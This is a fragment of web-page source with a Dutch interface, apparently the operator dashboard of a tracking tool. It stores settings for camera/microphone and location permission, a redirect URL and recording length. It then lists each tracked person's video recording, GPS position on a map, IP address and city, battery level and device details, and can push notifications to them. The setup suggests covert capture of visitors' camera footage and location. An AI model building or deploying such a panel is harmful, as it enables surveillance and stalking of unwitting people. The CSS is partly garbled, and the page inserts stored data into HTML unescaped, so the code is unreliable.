        .container {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 100%;
            max-width: 700px;

        h2 {

            border-bottom: 2px solid #007bff;
            padding-bottom: 10px;
        }
        .setting-row, .input-row {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        .toggle-switch {
            position: relative;
            display: inline-block;
            width: 60px;
            height: 30px;
        }
        .toggle-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 30px;
        }
        .slider:before {
            position: absolute;
            content: "";
            height: 22px;
            width: 22px;
            left: 4px;
            bottom: 4px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }
        input:checked + .slider {
            background-color: #00a86b;
        }
        input:focus + .slider {
            box-shadow: 0 0 2px #00a86b;
        }
        input:checked + .slider:before {
            transform: translateX(30px);
        }
        .label {
            margin-left: 20px;
            flex: 1;
            font-size: 1rem;
        }
        .input-row label {
            display: block;
            margin-bottom: 10px;
            color: #555;
            font-weight: bold;
        }
        .input-field {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 1rem;
        }
        .save-button, #trigger-redirect, #delete-all-data, .delete-user-button {
            background-color: #007bff;
            color: white;
            padding: 14px 24px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 1.1rem;
            transition: background-color 0.3s ease;
            margin-top: 20px;
            display: inline-block;
            text-decoration: none;
            text-align: center;
            margin-right: 10px;
        }
        .save-button:hover, #trigger-redirect:hover, #delete-all-data:hover, .delete-user-button:hover {
            background-color: #0056b3;
        }
        #delete-all-data, .delete-user-button {
            background-color: #dc3545;
        }

        #delete-all-data:hover, .delete-user-button:hover {
            background-color: #c82333;
        }


        .data-section {

            border-top: 1px solid #eee;
            padding-top: 30px;
        }
        .data-section h3 {
            color: #333;
            margin-bottom: 20px;
        }

            width: 100%;

            border-radius: 8px;

// --- Firestore References and Utility Functions (getNextUserId, getCurrentPositionPromise, getBatteryPromise) ---
// ... (Firestore references and utility functions - same as before) ...
async function getNextUserId() {
    const counterRef = db.collection('counters').doc('userCounter');

    try {
        const nextId = await db.runTransaction(async (transaction) => {
            const counterDoc = await transaction.get(counterRef);
            let newCounter = 1;
            if (counterDoc.exists) {
                newCounter = counterDoc.data().count + 1;
            } else {
                newCounter = 1;
            }
            transaction.set(counterRef, { count: newCounter }, { merge: true });
            return newCounter;
        });
        return `user${nextId}`;
    } catch (error) {
        console.error("Error getting next user ID:", error);
        errorMessage.textContent = `Firestore Fout: ${error.message}`;
        errorMessage.style.display = 'block';
        throw error;
    }
}


   // Utility function to promisify Geolocation API
    function getCurrentPositionPromise() {
        return new Promise((resolve, reject) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(resolve, reject);
            } else {
                reject(new Error("Geolocation is not supported"));
            }
        });
    }

     // Utility function to promisify Battery API
    function getBatteryPromise() {
        return new Promise((resolve, reject) => {
            if(navigator.getBattery) {
               resolve(navigator.getBattery());
            }else{
                reject(new Error("Battery API is not supported."));
            }
        });

    }

// Load settings AND data from Firestore
async function loadSettingsAndData(userId) {
    const settingsRef = db.collection('userSettings').doc(userId);

    try {
        const settingsSnap = await settingsRef.get();
        if (settingsSnap.exists) {
            const settingsData = settingsSnap.data();
            micCamPermissionToggle.checked = settingsData.micCamPermission || false;
            locationPermissionToggle.checked = settingsData.locationPermission || false;
            notificationPermissionToggle.checked = settingsData.notificationPermission || false;
            messageText.value = settingsData.messageText || '';
            redirectUrl.value = settingsData.redirectUrl || '';
            redirectSeconds.value = settingsData.redirectSeconds || '0';
            recordSeconds.value = settingsData.recordSeconds || '0';
            themeSelect.value = settingsData.selectedTheme || 'default'; // Load selected theme
        }
         updateExplanations();
         loadAllUserData(); // Load all user data after settings

    } catch (error) {
        console.error("Error loading settings/data:", error);
        errorMessage.textContent = `Firestore Fout: ${error.message}`;
        errorMessage.style.display = 'block';
    }
}

 // Update explanations
      function updateExplanations(){
        if(locationPermissionToggle.checked){
            locationExplanation.classList.remove("hidden");
        }else {
            locationExplanation.classList.add("hidden");
        }

        if(notificationPermissionToggle.checked){
                notificationExplanation.classList.remove("hidden");
        }else {
                notificationExplanation.classList.add("hidden");
        }
    }


// Save settings to Firestore, get next user ID, and reload
async function saveSettings() {
    try {
        const nextUserId = await getNextUserId();

        const settingsRef = db.collection('userSettings').doc(nextUserId);
        const settings = {
            micCamPermission: micCamPermissionToggle.checked,
            locationPermission: locationPermissionToggle.checked,
             notificationPermission: notificationPermissionToggle.checked,
            messageText: messageText.value,
            redirectUrl: redirectUrl.value,
            redirectSeconds: redirectSeconds.value,
            recordSeconds: recordSeconds.value,
            selectedTheme: themeSelect.value // Save selected theme
        };
         updateExplanations();

        await settingsRef.set(settings);
        console.log("Settings saved successfully for user:", nextUserId);
        successMessage.style.display = 'block';
        setTimeout(() => { successMessage.style.display = 'none'; }, 3000);

        currentUserId = nextUserId;
        loadSettingsAndData(currentUserId);

    } catch (error) {
        console.error("Error saving settings:", error);
        errorMessage.textContent = `Firestore Fout: ${error.message}`;
        errorMessage.style.display = 'block';
    }
}


// Function to display all user data in the table (ONE ROW PER USER - VERTICAL LAYOUT)
async function displayData(userId, userData) {
    const row = document.createElement('tr');
    row.id = `user-row-${userId}`;

    let cellContent = `
        <th>User ID: ${userId} <button class="delete-user-button" onclick="deleteUserData('${userId}')">Verwijder User</button></th>
        <td>
            <p>Opname: ${userData.videoUrl ? '<video src="' + userData.videoUrl + '" controls style="width: 100%;"></video>' : 'Geen Data'}</p>
            <p>Latitude: ${userData.location ? userData.location.latitude.toFixed(4) : 'Geen Data'}</p>
            <p>Longitude: ${userData.location ? userData.location.longitude.toFixed(4) : 'Geen Data'}</p>
            <p>Locatie Nauwkeurigheid: ${userData.location && userData.location.accuracy ? `±${userData.location.accuracy.toFixed(0)} meter` : 'Geen Data'}</p>
            <p>Locatie op Kaart: ${userData.location && userData.location.latitude && userData.location.longitude ? '<div id="location-map-' + userId + '" class="location-map" style="height: 200px; width: 100%;"></div>' : 'Geen Data'}</p>
            <p>IP Adres: ${userData.ipLocation ? userData.ipLocation.ip : 'Geen Data'}</p>
            <p>IP Stad: ${userData.ipLocation ? userData.ipLocation.city : 'Geen Data'}</p>
            <p>IP Regio: ${userData.ipLocation ? userData.ipLocation.region : 'Geen Data'}</p>
            <p>IP Land: ${userData.ipLocation ? userData.ipLocation.country : 'Geen Data'}</p>
            <p>Battery Percentage: ${userData.batteryPercentage ? `${userData.batteryPercentage.toFixed(0)}%` : 'Geen Data'}</p>
            <p>Locatie Fout: ${userData.locationError || 'Geen Data'}</p>
            <p>Batterij Fout: ${userData.batteryError || 'Geen Data'}</p>
            <p>Camera/Microfoon Fout: ${userData.cameraError || 'Geen Data'}</p>
            <p>Device Informatie: ${userData.deviceInfo || 'Geen Data'}</p>

            <div class="notification-cell">
                <input type="text" class="input-field" placeholder="Notificatie Titel" id="notification-title-${userId}" value="${userData.notificationTitle || ''}">
                <input type="text" class="input-field" placeholder="Notificatie Bericht" id="notification-body-${userId}" value="${userData.notificationBody || ''}">
                <input type="file" class="save-button" id="notification-icon-file-${userId}" accept="image/*">
                <input type="hidden" id="notification-icon-url-${userId}" value="${userData.notificationIcon || ''}">
                <button class="send-user-notification-button" onclick="sendNotificationForUser('${userId}')">Stuur Notificatie</button>
            </div>
        </td>
    `;
    row.innerHTML = cellContent;
    dataList.appendChild(row);

     if (userData.location && userData.location.latitude && userData.location.longitude) {
            setTimeout(() => {
                const map = L.map(`location-map-${userId}`).setView([userData.location.latitude, userData.location.longitude], 15);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                }).addTo(map);
                L.marker([userData.location.latitude, userData.location.longitude]).addTo(map)
                    .bindPopup('<b>Huidige Locatie</b>').openPopup();
            }, 0);
        }
}


// Function to load all user data and display the table (ONE ROW PER USER - VERTICAL LAYOUT)
async function loadAllUserData() {
    dataList.innerHTML = ''; // Clear the table body

    const userDataCollection = db.collection('userData');

    try {
        const snapshot = await userDataCollection.get();
        if (!snapshot.empty) {
            snapshot.forEach(doc => {
                const userId = doc.id;
                const userData = doc.data();
                displayData(userId, userData); // Display data for each user
            });
        } else {
            dataList.innerHTML = '<tr><td colspan="2" style="text-align:center;">Geen gebruikersdata gevonden.</td></tr>';
        }


    } catch (error) {
        console.error("Error fetching all user data:", error);
        errorMessage.textContent = `Fout bij laden gebruikersdata: ${error.message}`;
        errorMessage.style.display = 'block';
    }
}


// --- Function to send notification for a specific user ---
async function sendNotificationForUser(targetUserId) {
    if (Notification.permission !== 'granted') {
        errorMessage.textContent = "Notificatie toestemming niet gegeven voor deze browser. Kan geen notificatie sturen.";
        errorMessage.style.display = 'block';
        return;
    }

    const title = document.getElementById(`notification-title-${targetUserId}`).value;
    const body = document.getElementById(`notification-body-${targetUserId}`).value;
    const iconUrl = document.getElementById(`notification-icon-url-${targetUserId}`).value;


    if (!title || !body) {
        errorMessage.textContent = "Notificatie titel en bericht zijn niet ingesteld voor deze gebruiker.";
        errorMessage.style.display = 'block';
        return;
    }

    try {
        new Notification(title, {
            body: body,
            icon: iconUrl || undefined
        });
        successMessage.textContent = `Notificatie verstuurd voor gebruiker ${targetUserId}!`;
        successMessage.style.display = 'block';
        setTimeout(() => { successMessage.style.display = 'none'; }, 3000);


    } catch (error) {
        console.error("Error sending notification to user:", error);
        errorMessage.textContent = `Fout bij versturen notificatie: ${error.message}`;
        errorMessage.style.display = 'block';
    }
}


// --- Function to delete all user data ---
async function deleteAllData() {
    if (confirm("Weet je zeker dat je ALLE gebruikersdata wilt verwijderen? Dit kan NIET ongedaan gemaakt worden!")) {
        const userDataCollection = db.collection('userData');
        const counterRef = db.collection('counters').doc('userCounter');

        try {
            // Delete all documents in userData collection
            const querySnapshot = await userDataCollection.get();
            const batch = db.batch();
            querySnapshot.forEach(doc => {
                batch.delete(doc.ref);
            });
            await batch.commit();

            // Reset user counter to 0 or 1 (decide initial state)
            await counterRef.set({ count: 0 }); // Reset counter to 0

            console.log("All user data deleted successfully!");
            successMessage.textContent = "Alle gebruikersdata succesvol verwijderd!";
            successMessage.style.display = 'block';
            setTimeout(() => { successMessage.style.display = 'none'; }, 3000);

            loadAllUserData(); // Reload empty table

        } catch (error) {
            console.error("Error deleting all user data:", error);
            errorMessage.textContent = `Fout bij verwijderen alle gebruikersdata: ${error.message}`;
            errorMessage.style.display = 'block';
        }
    } else {
        console.log("Delete all data action cancelled by user.");
    }
}

// --- Function to delete data for a specific user ---
async function deleteUserData(targetUserId) {
    if (confirm(`Weet je zeker dat je de data van gebruiker ${targetUserId} wilt verwijderen? Dit kan NIET ongedaan gemaakt worden!`)) {
        const userRef = db.collection('userData').doc(targetUserId);

        try {
            await userRef.delete();
            console.log(`Data for user ${targetUserId} deleted successfully!`);
            successMessage.textContent = `Data voor gebruiker ${targetUserId} succesvol verwijderd!`;
            successMessage.style.display = 'block';
            setTimeout(() => { successMessage.style.display = 'none'; }, 3000);

            loadAllUserData(); // Reload user data table

        } catch (error) {
            console.error("Error deleting user data:", error);
            errorMessage.textContent = `Fout bij verwijderen gebruikersdata: ${error.message}`;
            errorMessage.style.display = 'block';
        }
    } else {
        console.log("Delete user data action cancelled by user.");
    }
}
